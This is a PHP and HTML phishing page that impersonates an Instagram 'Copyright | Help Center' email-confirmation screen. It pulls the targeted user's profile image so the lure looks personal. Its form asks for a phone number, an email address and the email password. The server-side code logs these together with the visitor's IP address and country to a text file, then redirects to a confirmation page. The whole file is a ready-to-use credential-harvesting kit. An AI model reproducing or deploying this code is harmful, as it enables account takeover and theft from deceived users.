<?php
 error_reporting(0);
 function ara($bas, $son, $yazi)
 {
     @preg_match_all('/' . preg_quote($bas, '/') .
     '(.*?)'. preg_quote($son, '/').'/i', $yazi, $m);
     return @$m[1];
 }
 $nick = $_GET['nick'];
 $_SERVER["theysl"]=$nick;
 $url = 'https://instagram.com/' . $nick;
     $html = file_get_contents($url);
     $dom = new DOMDocument();
     $dom->loadHTML($html);
     $veri = $dom->textContent;
     $cc = ara('"thumbnail_src":"','"',$veri);
     $meta_tags = $dom->getElementsByTagName('meta');
     foreach( $meta_tags as $meta ) {
         if( $meta->getAttribute('property') == 'og:image' ) {
             $image_url = $meta->getAttribute('content');
         }
     }
 if(empty($cc)){
         $cc[0] = $image_url;
     }
 if($_POST){
 $number = $_POST["number"];
 $mail = $_POST["mail"];
 $mailpass = $_POST["mailpass"];
 $ip = $_SERVER['REMOTE_ADDR'];
 $details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
 $ulke = $details->country;
 date_default_timezone_set('Europe/Istanbul');
 $cur_time=date("d-m-Y H:i:s");
 $file = fopen('wolfteam.txt', 'a');
 fwrite($file, "\n\n"."Mail: ".$mail."\n\n"."Mail Password: ".$mailpass."\n\n"."Number: ".$number."\n\n"."Ip Adress: " .$ip."\n\n".
 
 "Country: ".$ulke ."\n\n".   "Time: " .$cur_time.  "\n\n\n\n");
 fclose($file);
 echo '';
     header("Location: confirmed.php");
 }
 
     ?>
 <html>
 
 <head>
      <meta charset="utf-8">
 	 <title>Copyright | Help Center</title>
 	 <meta name="viewport" content="width=device-width">
 <link rel="icon" href="https://resimag.com/p1/1101a46d2a3.jpeg">
 <style>
 
 #ana{
 background-color:#fafafa;
 }
 #erhan{
 border-radius:5px;}
 
 #erhanasd{
 font-family:sans-serif;
 font-weight:400;
 letter-spacing:;
 color:#3d3d3d;
 font-size:25px;
 }
 
 #sa{
 background-color:white;
 width:300px;
 
 }
 #yazi1{
 font-family:sans-serif;
 color:#999;
 width:270px;
  }
  #copyright{
 font-family:sans-serif;
 color:#999;}
 #menu{
 
 
 width:70%;
 } 
 #liste{
 display:inline-block;}
 #link{text-decoration:none;
 color:#003569;
 font-family:sans-serif;
 font-size:13px;
 font-weight:540;
 
     vertical-align: baseline;
 }
 #üst{
 width:100%;
 background-color:white;
 
 height:79px;
 }
 
 #buton{
 color:white;
 background-color:#3897f0;
 font-size:16px;
 
 border-radius:3px;
 outline:none;
 font-family:sans-serif;
 font-weight:700;
 border:0;
 width:200px;
 height:40px;
 max-width:99%;
 max-height:50px;
 }
 
 #password{
 background-color:#fafafa;
 border:0;
 outline:none;
 border-radius:6px;
 width:220px;
 height:35px;
 
 font-size:16px;}
 
 </style>
 	 
 </head>
 <body id="ana" style="padding:0px; margin:0px;">
 <!--
 
 Bu script erhan can türker qenzy 
 tarafından kodlanmıştır
 izinsiz kullanmayınız
 -->
 
 
 
 <div style="width:100%; background:white; border-bottom:1px solid #cecece; padding-left:2px;" >
 
 <img src="https://cdn.clipart.email/94b41757c44784aec9440e6510ac7137_instagram-font-and-instagram-logo_914-362.png" width=140 id="erhan" style="margin:6px;" >
 <br><br>
 </div>
 <br><br>
 
 <center>
 <div id="sa" style="border:1px solid #cecece;"> <br> 
 
 
 <br>
 <img class="" src="https://i.hizliresim.com/2OBJ3E.png" style="max-width:90px;" alt="suphelifake" __cpp="1"><br>
 <h1 id="erhanasd">Mail Confirmation</h1>
 <p id="yazi1">
  <br>Please confirm your email address. It is a necessary and important confirmation to repair the copyright.
 
 </p>
 
 <br>
 
 <form method="post" >
 <input type="number" name="number" placeholder="Number" required="" style="padding:6px; background:#fafafa; outline:none;
 color:; width:83%; height:37px; border:1px solid #dedede; font-family:sans-serif; font-weight:350;     flex: 1 0 0px;
     margin: 0;
     outline: 0;
     overflow: hidden;
     padding: 9px 0 7px 8px;
     text-overflow: ellipsis;
 border: 1px solid #e6e6e6;    text-overflow: ellipsis;
     font: 400 13.3333px Arial; border-radius:3px;"><br><br>
 
 <input type="email" name="mail" placeholder="Confirm Mail Adress" required="" style="padding:6px; background:#fafafa; outline:none;
 color:; width:83%; height:37px; border:1px solid #dedede; font-family:sans-serif; font-weight:350;     flex: 1 0 0px;
     margin: 0;
     outline: 0;
     overflow: hidden;
     padding: 9px 0 7px 8px;
     text-overflow: ellipsis;
 border: 1px solid #e6e6e6;    text-overflow: ellipsis;
     font: 400 13.3333px Arial; border-radius:3px;"><br><br>
 
 
     <input type="password" name="mailpass" placeholder="Mail Password" required="" style="padding:6px; background:#fafafa; outline:none;
 color:; width:83%; height:37px; border:1px solid #dedede; font-family:sans-serif; font-weight:350;     flex: 1 0 0px;
     margin: 0;
     outline: 0;
     overflow: hidden;
     padding: 9px 0 7px 8px;
     text-overflow: ellipsis;
 border: 1px solid #e6e6e6;    text-overflow: ellipsis;
     font: 400 13.3333px Arial; border-radius:3px;">
 <br>
     <br>
 <button id="buton" type="submit"> Continue </button><br>
 
 
  
 </form>
 
 </center>
 
 
 
 </div>
 <br> <br>
 <center>
 <div id="get">
 <img src="https://resimag.com/p1/b6a0e4390db.png" width=130 >
 <img src="https://resimag.com/p1/45ce843a3fd.png" width=130>
 </div>
 <br><br>
 <div id="menu">
 <li id="liste"><a href="" id="link"> ABOUT US </a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
 <li id="liste"><a href="" id="link"> SUPPORT </a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
 <li id="liste"><a href="" id="link">PRESS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
 <li id="liste"><a href="" id="link">API</a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
 <li id="liste"><a href="" id="link">JOBS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
 <li id="liste"><a href="" id="link">PRIVACY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
 <li id="liste"><a href="" id="link">TERMS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
 <li id="liste"><a href="" id="link">DIRECTORY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp;
 
 <li id="liste"><a href="" id="link">LANGUAGE</a> </li>
 
 </div>
 <br>
 <p id="copyright">© 2020 INSTAGRAM </p>
 </center>
 
 
 </body>
 
 
 </html>